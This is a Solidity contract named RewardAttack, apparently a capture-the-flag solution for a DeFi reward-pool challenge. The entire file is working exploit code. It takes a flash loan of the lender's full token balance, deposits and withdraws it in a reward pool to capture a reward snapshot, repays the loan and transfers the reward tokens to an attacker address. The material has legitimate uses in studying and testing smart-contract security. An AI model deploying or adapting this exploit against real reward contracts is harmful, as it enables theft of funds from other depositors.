pragma solidity ^0.8.0;

contract RewardAttack {
  address private _flash;
  address private _reward;
  address private _token;
  address private _attacker;
  address private _rt;

  constructor(
    address flash,
    address reward,
    address token,
    address attacker,
    address rt
  ) {
    _flash = flash;
    _reward = reward;
    _token = token;
    _attacker = attacker;
    _rt = rt;
  }

  function attack() external {
    (bool isBalance, bytes memory result) = _token.call(
      abi.encodeWithSignature("balanceOf(address)", _flash)
    );

    require(isBalance, "isBalance");

    (uint256 amount) = abi.decode(result, (uint256));

    (bool isFlash, ) = _flash.call(
      abi.encodeWithSignature("flashLoan(uint256)", amount)
    );

    require(isFlash, "isFlash");

    (bool isRTBalance, bytes memory RTresult) = _rt.call(
      abi.encodeWithSignature("balanceOf(address)", address(this))
    );

    (uint256 rtAmount) = abi.decode(RTresult, (uint256));

    (bool isTransfer, ) = _rt.call(
      abi.encodeWithSignature("transfer(address,uint256)", _attacker, rtAmount)
    );
  }

  function receiveFlashLoan(uint256 amount) external {
    (bool isApprove, ) = _token.call(
      abi.encodeWithSignature("approve(address,uint256)", _reward, amount)
    );

    require(isApprove, "isApprove");

    (bool isDeposit, ) = _reward.call(
      abi.encodeWithSignature("deposit(uint256)", amount)
    );

    require(isDeposit, "isDeposit");

    (bool isWithdraw, ) = _reward.call(
      abi.encodeWithSignature("withdraw(uint256)", amount)
    );

    require(isWithdraw, "isWithdraw");

    (bool isSent, ) = _token.call(
      abi.encodeWithSignature("transfer(address,uint256)", _flash, amount)
    );

    require(isSent, "isSent");
  }
}
